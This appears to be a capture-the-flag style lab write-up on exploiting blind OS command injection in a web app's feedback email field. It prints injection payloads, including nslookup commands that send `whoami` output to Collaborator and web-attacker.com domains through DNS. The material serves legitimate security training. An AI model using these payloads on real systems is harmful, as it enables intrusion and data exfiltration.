# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VELT36CC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222007Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDFlNy8u8ESvGg4%2BzaaSVr16uVxrqjoAET1bAcQjQhrrAiAhEZaUQYg0XyS5RiRlETSWtNl7AzH1lpwQ0UOIr49WMSqIBAiu%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMY5chb2uV6JkF2spGKtwDIu%2FLWnbq6IjY%2FGQ6xgOmDc%2BuCbJNvUmCm8qHtVm7KuTWlE2eqhAB%2FlT7gYNIbYXnK1zMKfMZGGDidf7SzltjxWG%2B3UqnPIoOhfqTeoIpRHKrXOlPy843OLowxbgTxVc3CijjQnZfBD2g8mBJbbcI6CSV%2Fz34dfcv%2FgKzjA2h%2FDy3of8MPJImCQKobKQlcgZILWS7tttTwxAL7PH8dhAyml%2B3mOqOduSeRAHmRu5sn06kXoA%2FUiyNo3AGNhczesQtM7Qo1jTk5lNid9Il8M%2BSeXpJrdI%2BvlVfUWZhqyWyJEFXeP%2FydBEg71nd%2BC9aYT6kUDhdmB%2BM0mbfiuIRPlJQ6XLT5nHFu34tA%2BMcNXRwi1h7BRNzTb5BKgmNztmVQ4J3bCRx7wTM4gFindzBp04ppSvBMlndEuAfClN9Z4Hh3p7%2FAgL9%2FE6buJTKXgsgrlU45mUq9CeC%2FBq%2BdxNtT9O%2FksSyG8ak0CU4flwmfbjqs7SV9mLTCFPrgX%2BMNR3j0zGuOgAwmGZtPM1vEb5yOt5PL7wNLSDTuCJwgoMj3CZPt%2FQcD0K%2B2OVtkYSsVdDtJHVMov%2FSk2OlNRCMNyQyM3Zl6amzDC3FK84Yqccmy2hmIPRhgSWSNP8%2BNpMx9towlISj1AY6pgHgYVv1Pazk0GusfYSC0VgdJf67b4gTxYyrnLcPynH5%2FfiAlCS4lPiDgQtXRBH5A6EI5%2F%2F4Hg4H3LTuWmrFG59rTt4RQJWFiDkgMxv8FZK4mU7ZDiysfE3Mn11iG11zwO37M7IXWcdzguyUSPlzO%2BjTVUasMLwsPzYeT5OBBut5XfA2sPQcL5SxuY2D2TQbpY8jL3yPJcf9uchYFPi2JGNBfRnsak3C&X-Amz-Signature=c0e4b23177eec1be81e4a145d36587f0f911b852c3d9b24f7518cb969da95e1f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/920c3740-dd8c-4461-923c-60ef01a5914b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VELT36CC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222007Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDFlNy8u8ESvGg4%2BzaaSVr16uVxrqjoAET1bAcQjQhrrAiAhEZaUQYg0XyS5RiRlETSWtNl7AzH1lpwQ0UOIr49WMSqIBAiu%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMY5chb2uV6JkF2spGKtwDIu%2FLWnbq6IjY%2FGQ6xgOmDc%2BuCbJNvUmCm8qHtVm7KuTWlE2eqhAB%2FlT7gYNIbYXnK1zMKfMZGGDidf7SzltjxWG%2B3UqnPIoOhfqTeoIpRHKrXOlPy843OLowxbgTxVc3CijjQnZfBD2g8mBJbbcI6CSV%2Fz34dfcv%2FgKzjA2h%2FDy3of8MPJImCQKobKQlcgZILWS7tttTwxAL7PH8dhAyml%2B3mOqOduSeRAHmRu5sn06kXoA%2FUiyNo3AGNhczesQtM7Qo1jTk5lNid9Il8M%2BSeXpJrdI%2BvlVfUWZhqyWyJEFXeP%2FydBEg71nd%2BC9aYT6kUDhdmB%2BM0mbfiuIRPlJQ6XLT5nHFu34tA%2BMcNXRwi1h7BRNzTb5BKgmNztmVQ4J3bCRx7wTM4gFindzBp04ppSvBMlndEuAfClN9Z4Hh3p7%2FAgL9%2FE6buJTKXgsgrlU45mUq9CeC%2FBq%2BdxNtT9O%2FksSyG8ak0CU4flwmfbjqs7SV9mLTCFPrgX%2BMNR3j0zGuOgAwmGZtPM1vEb5yOt5PL7wNLSDTuCJwgoMj3CZPt%2FQcD0K%2B2OVtkYSsVdDtJHVMov%2FSk2OlNRCMNyQyM3Zl6amzDC3FK84Yqccmy2hmIPRhgSWSNP8%2BNpMx9towlISj1AY6pgHgYVv1Pazk0GusfYSC0VgdJf67b4gTxYyrnLcPynH5%2FfiAlCS4lPiDgQtXRBH5A6EI5%2F%2F4Hg4H3LTuWmrFG59rTt4RQJWFiDkgMxv8FZK4mU7ZDiysfE3Mn11iG11zwO37M7IXWcdzguyUSPlzO%2BjTVUasMLwsPzYeT5OBBut5XfA2sPQcL5SxuY2D2TQbpY8jL3yPJcf9uchYFPi2JGNBfRnsak3C&X-Amz-Signature=86560420b2432f1df7c4508922f97a46abcf3d8ca99734b4e65e311d5cd9e21f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

> 💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0ede8f97-e945-4d3d-a9af-76c2069b3801/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VELT36CC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222007Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDFlNy8u8ESvGg4%2BzaaSVr16uVxrqjoAET1bAcQjQhrrAiAhEZaUQYg0XyS5RiRlETSWtNl7AzH1lpwQ0UOIr49WMSqIBAiu%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMY5chb2uV6JkF2spGKtwDIu%2FLWnbq6IjY%2FGQ6xgOmDc%2BuCbJNvUmCm8qHtVm7KuTWlE2eqhAB%2FlT7gYNIbYXnK1zMKfMZGGDidf7SzltjxWG%2B3UqnPIoOhfqTeoIpRHKrXOlPy843OLowxbgTxVc3CijjQnZfBD2g8mBJbbcI6CSV%2Fz34dfcv%2FgKzjA2h%2FDy3of8MPJImCQKobKQlcgZILWS7tttTwxAL7PH8dhAyml%2B3mOqOduSeRAHmRu5sn06kXoA%2FUiyNo3AGNhczesQtM7Qo1jTk5lNid9Il8M%2BSeXpJrdI%2BvlVfUWZhqyWyJEFXeP%2FydBEg71nd%2BC9aYT6kUDhdmB%2BM0mbfiuIRPlJQ6XLT5nHFu34tA%2BMcNXRwi1h7BRNzTb5BKgmNztmVQ4J3bCRx7wTM4gFindzBp04ppSvBMlndEuAfClN9Z4Hh3p7%2FAgL9%2FE6buJTKXgsgrlU45mUq9CeC%2FBq%2BdxNtT9O%2FksSyG8ak0CU4flwmfbjqs7SV9mLTCFPrgX%2BMNR3j0zGuOgAwmGZtPM1vEb5yOt5PL7wNLSDTuCJwgoMj3CZPt%2FQcD0K%2B2OVtkYSsVdDtJHVMov%2FSk2OlNRCMNyQyM3Zl6amzDC3FK84Yqccmy2hmIPRhgSWSNP8%2BNpMx9towlISj1AY6pgHgYVv1Pazk0GusfYSC0VgdJf67b4gTxYyrnLcPynH5%2FfiAlCS4lPiDgQtXRBH5A6EI5%2F%2F4Hg4H3LTuWmrFG59rTt4RQJWFiDkgMxv8FZK4mU7ZDiysfE3Mn11iG11zwO37M7IXWcdzguyUSPlzO%2BjTVUasMLwsPzYeT5OBBut5XfA2sPQcL5SxuY2D2TQbpY8jL3yPJcf9uchYFPi2JGNBfRnsak3C&X-Amz-Signature=bbf6d0557eb50540918b4e45c91c14f89852de877005e17d4442ece4f6cfba0d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The username is shown in the DNS request:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/91b1cdca-b79b-4600-b61a-bbb70e358201/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VELT36CC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T222007Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDFlNy8u8ESvGg4%2BzaaSVr16uVxrqjoAET1bAcQjQhrrAiAhEZaUQYg0XyS5RiRlETSWtNl7AzH1lpwQ0UOIr49WMSqIBAiu%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMY5chb2uV6JkF2spGKtwDIu%2FLWnbq6IjY%2FGQ6xgOmDc%2BuCbJNvUmCm8qHtVm7KuTWlE2eqhAB%2FlT7gYNIbYXnK1zMKfMZGGDidf7SzltjxWG%2B3UqnPIoOhfqTeoIpRHKrXOlPy843OLowxbgTxVc3CijjQnZfBD2g8mBJbbcI6CSV%2Fz34dfcv%2FgKzjA2h%2FDy3of8MPJImCQKobKQlcgZILWS7tttTwxAL7PH8dhAyml%2B3mOqOduSeRAHmRu5sn06kXoA%2FUiyNo3AGNhczesQtM7Qo1jTk5lNid9Il8M%2BSeXpJrdI%2BvlVfUWZhqyWyJEFXeP%2FydBEg71nd%2BC9aYT6kUDhdmB%2BM0mbfiuIRPlJQ6XLT5nHFu34tA%2BMcNXRwi1h7BRNzTb5BKgmNztmVQ4J3bCRx7wTM4gFindzBp04ppSvBMlndEuAfClN9Z4Hh3p7%2FAgL9%2FE6buJTKXgsgrlU45mUq9CeC%2FBq%2BdxNtT9O%2FksSyG8ak0CU4flwmfbjqs7SV9mLTCFPrgX%2BMNR3j0zGuOgAwmGZtPM1vEb5yOt5PL7wNLSDTuCJwgoMj3CZPt%2FQcD0K%2B2OVtkYSsVdDtJHVMov%2FSk2OlNRCMNyQyM3Zl6amzDC3FK84Yqccmy2hmIPRhgSWSNP8%2BNpMx9towlISj1AY6pgHgYVv1Pazk0GusfYSC0VgdJf67b4gTxYyrnLcPynH5%2FfiAlCS4lPiDgQtXRBH5A6EI5%2F%2F4Hg4H3LTuWmrFG59rTt4RQJWFiDkgMxv8FZK4mU7ZDiysfE3Mn11iG11zwO37M7IXWcdzguyUSPlzO%2BjTVUasMLwsPzYeT5OBBut5XfA2sPQcL5SxuY2D2TQbpY8jL3yPJcf9uchYFPi2JGNBfRnsak3C&X-Amz-Signature=bd9f15df0d787fab5894987861756e7b4f04f4daa96d79876d2a7f01fdbdd821&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
